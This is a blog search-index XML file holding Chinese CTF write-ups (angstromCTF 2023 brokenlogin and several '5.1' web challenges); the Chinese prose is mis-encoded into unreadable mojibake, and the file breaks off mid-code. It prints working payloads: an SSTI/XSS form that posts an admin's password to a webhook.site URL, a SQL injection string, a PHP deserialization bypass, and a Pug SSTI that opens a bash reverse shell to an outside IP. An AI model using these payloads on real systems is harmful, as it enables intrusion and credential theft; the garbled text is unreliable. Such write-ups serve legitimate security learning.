<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>angstromCTF 2023 brokenloginè§£é¢˜</title>
    <url>/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/</url>
    <content><![CDATA[<p>WEB brokenlogin</p>
<span id="more"></span>

<p>é¢˜ç›®ç»™äº†ä¸¤ä¸ªç½‘é¡µå’Œä¸¤ä¸ªæºç ï¼Œåˆ†åˆ«æ˜¯</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173909360.png" alt="image-20230428173909360"></p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173915868.png" alt="image-20230428173915868"></p>
<p>æºç åˆ†åˆ«ä¸º</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;brokenlogin&quot;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">7000</span>,</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">execute</span>(<span class="params">browser, url</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^https:\/\/brokenlogin\.web\.actf\.co\/.*/</span>.<span class="title function_">test</span>(url)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForNetworkIdle</span>(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=username]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=username]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el</span>) =&gt;</span> (el.<span class="property">value</span> = <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=password]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=password]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el, password</span>) =&gt;</span> (el.<span class="property">value</span> = password),</span><br><span class="line">            process.<span class="property">env</span>.<span class="property">CHALL_BROKENLOGIN_FLAG</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;input[type=submit]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, escape, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">fails = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">indexPage = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Broken Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;color: red; fontSize: &#x27;28px&#x27;;&quot;&gt;%s&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Number of failed logins: &#123;&#123; fails &#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    custom_message = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;message&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(request.args[<span class="string">&quot;message&quot;</span>]) &gt;= <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(indexPage, fails=fails)</span><br><span class="line">        </span><br><span class="line">        custom_message = escape(request.args[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template_string(indexPage % custom_message, fails=fails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    fails += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&quot;wrong username or password&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹ç¬¬ä¸€ä¸ªæºä»£ç ï¼Œä¸»è¦æœ‰ç”¨çš„åœ°æ–¹æ˜¯</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174142845.png" alt="image-20230428174142845"></p>
<p>æ„æ€æ˜¯æœ‰usernameå’Œpasswordè¾“å…¥æ¡†ï¼Œä½†æ˜¯passwordè¾“å…¥æ¡†è¿™é‡Œå¤šäº†ä¸€æ¡<code>process.env.CHALL_BROKENLOGIN_FLAG</code>ï¼Œflagå°±åœ¨å…¶ä¸­</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174328760.png" alt="image-20230428174328760"></p>
<p>è¿™é‡Œçš„æ„æ€æ˜¯é€šè¿‡evalæ–¹æ³•æ¥è·å–åä¸ºpasswordçš„å…ƒç´ ï¼Œå¹¶å°†å®ƒè®¾ç½®ä¸º<code>process.env.CHALL_BROKENLOGIN_FLAG</code></p>
<p>ç„¶åå†çœ‹å¦ä¸€ä¸ªæºä»£ç ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªè·¯ç”±</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174556173.png" alt="image-20230428174556173"></p>
<p>è¿™é‡Œå¯ä»¥ä¼ å‚messageï¼Œè¿˜æœ‰ä¸¤ä¸ªifï¼Œçœ‹ç¬¬äºŒä¸ªifï¼Œå¦‚æœä¼ å…¥çš„messageå¤§äºç­‰äº25ï¼Œå°±ä¼š<code>return render_template_string(indexPage, fails=fails)</code>ï¼Œå¦åˆ™å°±ä¼š<code>return render_template_string(indexPage % custom_message, fails=fails)</code>ï¼Œç¬¬äºŒä¸ªreturnå¯ä»¥å°†æˆ‘ä»¬ä¼ å‚çš„messageåŒ…å«è¿›å»ï¼ŒçŒœæµ‹æœ‰sstiï¼Œå»ç½‘é¡µä¸Šæµ‹è¯•ä¸€ä¸‹</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428175356726.png" alt="image-20230428175356726"></p>
<p>ç¡®å®å¯ä»¥sstiï¼Œä½†æ˜¯æœ‰é™åˆ¶ï¼Œmessageä¼ å‚çš„é•¿åº¦ä¸èƒ½å¤§äº25ï¼Œç»•è¿‡è¿™ä¸ªå¯ä»¥ä½¿ç”¨ä»¥ä¸‹payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?message=&#123;&#123;request.args.a&#125;&#125;&amp;a=</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428193302563.png" alt="image-20230428193302563"></p>
<p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡é•¿åº¦é™åˆ¶ï¼Œè¯•è¯•çœ‹èƒ½ä¸èƒ½ä½¿ç”¨xss</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194624660.png" alt="image-20230428194624660"></p>
<p>å°†è¾“å…¥çš„å½“æˆäº†å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨safeï¼Œå¦‚ä»¥ä¸‹ï¼Œå¯ä»¥xssè¯­å¥åˆ¤å®šä¸ºå®‰å…¨ï¼Œè€Œä¸æ˜¯è½¬ä¸ºå­—ç¬¦ä¸²</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194635131.png" alt="image-20230428194635131"></p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194827209.png" alt="image-20230428194827209"></p>
<p>è¿™æ ·å°±æˆåŠŸæ‰§è¡Œäº†ï¼Œå› ä¸ºflagåœ¨passwordï¼Œæ‰€ä»¥éœ€è¦è¯»å–è¿™é‡Œçš„ä¿¡æ¯ï¼Œå¦‚æœusernameå’Œpasswordä»€ä¹ˆéƒ½ä¸è¾“å…¥ï¼Œå°±ä¼šè‡ªåŠ¨å¡«å…¥æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œæ‰€ä»¥å†æ„é€ ä¸€ä¸ªè¡¨å•ï¼Œä½¿ç”¨<a href="https://webhook.site/">webhook</a>æ¥è¿›è¡Œæˆªå–ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://brokenlogin.web.actf.co/?message=&#123;&#123;request.args.a|safe&#125;&#125;&amp;a=&lt;form action=&quot;https://webhook.site/14144f4b-81cb-4e28-b9b0-0e067d387836&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195535198.png" alt="image-20230428195535198"></p>
<p>æˆåŠŸæ„é€ å‡ºä¸€ä¸ªè¡¨å•ï¼Œä½¿ç”¨botå°†ç½‘é¡µå‘å‡º</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195621788.png" alt="image-20230428195621788"></p>
<p>äºæ˜¯åœ¨webhookæ¥æ”¶åˆ°flag</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195657372.png" alt="image-20230428195657372"></p>
]]></content>
  </entry>
  <entry>
    <title>5.1è§£é¢˜</title>
    <url>/2023/05/03/5.1%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>5.1</p>
<span id="more"></span>

<h2 id="ä¸€"><a href="#ä¸€" class="headerlink" title="ä¸€"></a>ä¸€</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503113946015.png" alt="image-20230503113946015"></p>
<p>ç»™äº†æç¤ºæ˜¯mysql8ï¼Œè¯¥ç‰ˆæœ¬æ–°å‡ºäº†å¾ˆå¤šæŸ¥è¯¢æ–°æ–¹æ³•ï¼Œè¿™ä¸ªé¢˜ç›®å·²ç»ç»™å‡ºäº†è¡¨ï¼Œç»è¿‡æµ‹è¯•selectè¢«è¿‡æ»¤äº†</p>
<p>æŸ¥èµ„æ–™å¯ä»¥ä½¿ç”¨TABLEæ–°å‡ºçš„æŸ¥è¯¢è¯­å¥</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; TABLE flagusers ORDER BY username LIMIT 1#&amp;password=1</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨payloadåç›´æ¥å›æ˜¾äº†ç”¨æˆ·åå’Œå¯†ç </p>
<h2 id="äºŒ"><a href="#äºŒ" class="headerlink" title="äºŒ"></a>äºŒ</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === <span class="string">&#x27;i_am_pop_god&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="string">&#x27;nonono too yong too simple&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ååºåˆ—åŒ–ï¼Œå½“<code>start</code>çš„å€¼ç­‰äº<code>i_am_pop_god</code>æ—¶å°±ä¼šè¿”å›flagï¼Œä½†æ˜¯<code>__wakeup</code>é­”æœ¯æ–¹æ³•ä¼šå°†<code>start</code>èµ‹å€¼ä¸º<code>nonono too yong too simple</code>ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡è¿™ä¸ªé­”æœ¯æ–¹æ³•</p>
<p>æœ‰ä¸€ç§ç»•è¿‡æ–¹æ³•æ˜¯ä¿®æ”¹ååºåˆ—åŒ–åçš„æ•°æ®ï¼Œä¿®æ”¹å…ƒç´ æ•°ï¼Œä¾‹å¦‚è¿™ä¸ªååºåˆ—åŒ–æœ‰3ä¸ªå…ƒç´ ï¼Œé‚£å°±å°†3ä¿®æ”¹æˆå¤§äº3çš„æ•°</p>
<p>ä½†æ˜¯è¿™é‡Œä¸èƒ½ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç‰ˆæœ¬ä¸æ”¯æŒï¼Œä½†è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨å¼•ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params">&amp;<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$x</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$x</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">è¾“å‡º<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥è®©$aç­‰äºçš„11ï¼ŒæŒ‰ç†è¯´åº”è¯¥è¾“å‡ºçš„11ï¼Œä½†æ˜¯è¿™ä¸ªå´æ˜¯è¾“å‡ºçš„123</p>
<p>å–æ¶ˆ&amp;ç¬¦å·å</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$x</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">è¾“å‡º<span class="number">11</span></span><br></pre></td></tr></table></figure>

<p>è¿™å°±è¾“å‡ºäº†11</p>
<p>åˆ©ç”¨è¿™ä¸ªå¼•ç”¨çš„æ–¹æ³•ï¼Œè®©<code>__wakeup</code>æ‰§è¡Œä»¥åï¼Œå†è¿›è¡Œå¼•ç”¨æ¥ä¿®æ”¹å€¼</p>
<p>åˆ©ç”¨æºä»£ç ä¸­çš„<code>$this-&gt;b=$this-&gt;a;</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b= &amp;<span class="variable">$a</span>-&gt;start;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="string">&quot;i_am_pop_god&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰"><a href="#ä¸‰" class="headerlink" title="ä¸‰"></a>ä¸‰</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150532218.png" alt="image-20230503150532218"></p>
<p>è®¿é—®&#x2F;time</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150548438.png" alt="image-20230503150548438"></p>
<p>æŸ¥çœ‹cookieï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªtimeï¼Œ<code>time=MQ%3D%3D</code>å°†MQbase64è§£ç ä¸º1ï¼Œ%3Dæ˜¯&#x3D;ï¼Œè¿™ä¸ªåº”è¯¥å­˜åœ¨æ³¨å…¥ç‚¹</p>
<p>ç»™äº†æç¤ºæ˜¯<a href="https://www.hackingloops.com/ssti-in-pug/">pugæ¨¡æ¿ssti</a>ï¼ŒæŸ¥è¯¢èµ„æ–™æŸ¥åˆ°<code>#&#123;7*7&#125;</code></p>
<p>ä½¿ç”¨è¯•è¯•ï¼Œæ³¨æ„è¦å°†ä¼ å…¥çš„base64ç¼–ç </p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150848571.png" alt="image-20230503150848571"></p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150853016.png" alt="image-20230503150853016"></p>
<p>é¡ºåˆ©è¿”å›</p>
<p>ç›´æ¥ä½¿ç”¨shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&#123;function()&#123;localLoad=global.process.mainModule.constructor._load;sh=localLoad(&quot;child_process&quot;).exec(&#x27;bash -c &quot;sh -i &gt;&amp; /dev/tcp/xx.x.x.xx/1111 0&gt;&amp;1&quot;&#x27;)&#125;()&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–ç ä»¥åä¼ å…¥</p>
<p>ä½¿ç”¨äº‘æœåŠ¡å™¨ç›‘å¬1111ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1111</span><br></pre></td></tr></table></figure>

<h2 id="å››"><a href="#å››" class="headerlink" title="å››"></a>å››</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503151212372.png" alt="image-20230503151212372"></p>
<p>æºç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> nunjucks = <span class="built_in">require</span>(<span class="string">&#x27;nunjucks&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> uuid = <span class="built_in">require</span>(<span class="string">&quot;uuid&quot;</span>).<span class="property">v4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SESSION_SECRET</span> = process.<span class="property">env</span>.<span class="property">SESSION_SECRET</span> || <span class="title function_">uuid</span>();</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">nunjucks.<span class="title function_">configure</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&#x27;views&#x27;</span>), &#123;</span><br><span class="line">    <span class="attr">autoescape</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">express</span>: app</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">engine</span>(<span class="string">&#x27;njk&#x27;</span>,nunjucks.<span class="property">render</span>)</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>,<span class="string">&#x27;njk&#x27;</span>)</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;</span><br><span class="line">        <span class="attr">extended</span>: <span class="literal">true</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">        <span class="attr">secret</span>:<span class="variable constant_">SESSION_SECRET</span>,</span><br><span class="line">        <span class="attr">resave</span>:<span class="literal">false</span>,</span><br><span class="line">        <span class="attr">saveUninitialized</span>:<span class="literal">true</span>,</span><br><span class="line">        <span class="attr">cookie</span>:&#123;</span><br><span class="line">            <span class="attr">maxAge</span>:<span class="number">3600</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkLogin</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">token</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;plz login first&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> check=&#123;&#125;</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">async</span> (req,res)=&gt;&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;please try to get(may be post) /login to login &#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="title function_">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> user=&#123;&#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    user = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">username</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(check.<span class="property">Admin</span>)</span><br><span class="line">    <span class="keyword">if</span>(user.<span class="property">username</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (user.<span class="property">username</span>==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">               check.<span class="property">Admin</span> = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">           &#125;</span><br><span class="line">            <span class="keyword">switch</span> (check.<span class="property">Admin</span>)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    req.<span class="property">session</span>.<span class="property">token</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    req.<span class="property">session</span>.<span class="property">username</span> = user.<span class="property">username</span>;</span><br><span class="line">                    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/admin&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    req.<span class="property">session</span>.<span class="property">token</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/user&#x27;</span>);</span><br><span class="line">                <span class="attr">default</span>:</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;please send you username as json to login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/user&#x27;</span>,checkLogin,<span class="function">(<span 